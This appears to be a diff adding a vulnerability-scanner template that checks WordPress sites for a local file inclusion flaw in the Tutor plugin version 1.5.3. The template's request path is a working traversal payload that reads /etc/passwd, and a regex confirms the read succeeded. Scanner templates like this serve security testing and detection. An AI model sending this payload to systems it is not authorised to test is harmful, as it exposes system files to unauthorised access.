@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - part: body
+          regex:
+            - 'root:.*:0:0:'
+          type: regex
+      method: GET
+      path:
+        - '{{BaseURL}}/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd'
+id: wp-tutor-lfi
+info:
+    author: 0x240x23elu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: WordPress tutor.1.5.3 is vulnerable to local file inclusion.
+    metadata:
+        max-request: 1
+    name: WordPress tutor 1.5.3 - Local File Inclusion
+    reference:
+        - https://www.exploit-db.com/exploits/48058
+    severity: high
+    tags:
+        - wordpress
+        - wp-plugin
+        - edb
+        - WordPress
